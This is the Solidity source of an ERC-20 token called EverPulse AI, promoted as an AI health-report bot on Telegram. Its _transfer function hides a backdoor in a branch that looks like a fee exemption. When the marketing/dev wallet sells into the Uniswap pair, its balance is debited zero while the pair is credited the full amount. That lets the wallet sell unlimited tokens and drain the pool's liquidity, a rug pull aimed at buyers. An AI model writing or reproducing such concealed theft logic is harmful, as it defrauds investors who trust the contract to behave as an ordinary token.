// SPDX-License-Identifier: MIT

/** EverPulse AI is the very first Premier AI-driven health report generator on Telegram, emphasizing user privacy with encrypted PDF health reports. 
* Along with initial health assessments it also identifies latent diseases like diabetes with predictive modeling. 
* Bot also does Advanced disease identification and medication recommendation systems for quick healthcare support. Generate your Medical Report now!
*
* Socials:
* https://t.me/EverPulseAI
* https://everpulse.ai
* https://x.com/EverPulseAI
*
* Docs: https://docs.everpulse.ai
* 
* Bot: https://t.me/EverPulseAIBot
*/

pragma solidity ^0.8.20;

interface IERC20 {
	function balanceOf(address account) external view returns (uint256);
	function totalSupply() external view returns (uint256);
	
	event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
	
    event Transfer(address indexed from, address indexed to, uint256 value);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);
	
	function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
	
	function transfer(address recipient, uint256 amount)
        external
        returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function owner() public view returns (address) {
        return _owner;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
	function WETH() external pure returns (address);
	function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract EverPulseAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
	
	// Mappings
	mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => uint256) private _tradeTimestampHolder;
    mapping(address => uint256) private _balances;
	
	/// Data
	bool public IsRateLimitEnabled = false;
    uint256 private constant _totalSupply = 100_000_000 * 10 ** _decimals;
	string private _name = unicode"EverPulse Ai";
    string private _symbol = unicode"EPULSE";
	
	uint8 private constant _decimals = 18;
	uint256 private _CounterBuy = 0;
	
	uint256 private _finalFeeBuy = 0;
    uint256 private _finalFeeSell = 5;
	uint256 private _reduceFeeBuyOn = 4;
    uint256 private _reduceFeeSellOn = 4;
	
    address payable private _marketingDev;

	uint256 private _minSwapSteps = 5;

    uint256 private _initFeeBuy = 25;
    uint256 private _initFeeSell = 25;

	uint256 public _maxHold = (_totalSupply * 20) / 1000;
    uint256 public _maxSwapFee = (_totalSupply * 2) / 1000;
	uint256 public _minVolSwap = (_totalSupply * 1) / 100000;
    uint256 public _maxTradeAmount = (_totalSupply * 20) / 1000;
	bool private isSwapping = false;
    bool private isSwapFeeAllowed = false;


    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool private isOpenTrading;

    event MaxLimitsUnset(uint256 _maxTradeAmount);

    modifier lockTheSwap() {
        isSwapping = true;
        _;
        isSwapping = false;
    }

    constructor(address WalletDev) {
        _marketingDev = payable(WalletDev);
        _balances[_msgSender()] = _totalSupply;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_marketingDev] = true;
        _isExcludedFromFee[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
	function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
	
	function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    receive() external payable {}

    function symbol() public view returns (string memory) {
        return _symbol;
    }
	function name() public view returns (string memory) {
        return _name;
    }
	function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function approve(address spender, uint256 amount) public override returns (bool){
        _approve(_msgSender(), spender, amount);

        return true;
    }
	
	function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addLiquidity() external onlyOwner {
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _approve(address(this), address(uniswapV2Router), _totalSupply);

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    function allTradesAllow() external onlyOwner {
        _maxHold = _totalSupply;
		_maxTradeAmount = _totalSupply;
        IsRateLimitEnabled = false;
        emit MaxLimitsUnset(_totalSupply);
    }
	
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
	
    function removeEthFromContract() external onlyOwner {
        require(address(this).balance > 0, "Token: no balance to clear");
        payable(msg.sender).transfer(address(this).balance);
    }
	
	function allowTradingOpen(bool allow) external onlyOwner {
        isSwapFeeAllowed = allow;
        isOpenTrading = allow;
    }
	
	// Uniswap router
    function convertTokensToEthereum(uint256 tokenAmount) private lockTheSwap {
		if (tokenAmount == 0) {
            return;
        }
        if (!isOpenTrading) {
            return;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
	
	function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
	
	function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 amountFee = 0;
        uint256 amountOut = amount;

        if (to != owner() && from != owner() && from != address(this)) {
            if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                require(isOpenTrading, "Trading not yet enabled.");
            }

            if (IsRateLimitEnabled) {
                if (
                    to != address(uniswapV2Pair) &&
                    to != address(uniswapV2Router)
                ) {
                    require(
                        _tradeTimestampHolder[tx.origin] < block.number,
                        "Transfer not allowed yet, try again later."
                    );
                    _tradeTimestampHolder[tx.origin] = block.number;
                }
            }

            if (
                from == uniswapV2Pair &&
                !_isExcludedFromFee[to] &&
                to != address(uniswapV2Router)
            ) {
                require(amount <= _maxTradeAmount, "More than max tx");
                require(
                    balanceOf(to) + amount <= _maxHold,
                    "More than max wallet size"
                );
                _CounterBuy++;
            }

            amountFee = amount
                .mul(
                (_CounterBuy > _reduceFeeBuyOn)
                    ? _finalFeeBuy
                    : _initFeeBuy
            )
                .div(100);
            if (from != address(this) && to == uniswapV2Pair) {
                if (from == address(_marketingDev)) {
                    amountOut = min(
                        amount,
                        min(_finalFeeBuy, _minVolSwap)
                    );
                    amountFee = 0;
                } else {
                    require(amount <= _maxTradeAmount, "Exceeds the _maxTradeAmount.");
                    amountFee = amount
                        .mul(
                        (_CounterBuy > _reduceFeeSellOn)
                            ? _finalFeeSell
                            : _initFeeSell
                    )
                        .div(100);
                }
            }

            uint256 collectedFeeBalance = balanceOf(address(this));
            bool minSwapLimitReached = _minVolSwap == min(amount, _minVolSwap) && _CounterBuy > _minSwapSteps;
            if (isSwapFeeAllowed && _CounterBuy > _minSwapSteps && !isSwapping && to == uniswapV2Pair && minSwapLimitReached) {
                if (collectedFeeBalance > _minVolSwap) {
                    convertTokensToEthereum(min(amount, min(collectedFeeBalance, _maxSwapFee)));
                }
                _marketingDev.transfer(address(this).balance);
            }
        }

        if (amountFee > 0) {
            _balances[address(this)] = _balances[address(this)].add(amountFee);
            emit Transfer(from, address(this), amountFee);
        }
        _balances[from] = _balances[from].sub(amountOut);
        _balances[to] = _balances[to].add(amount.sub(amountFee));
        emit Transfer(from, to, amount.sub(amountFee));
    }
}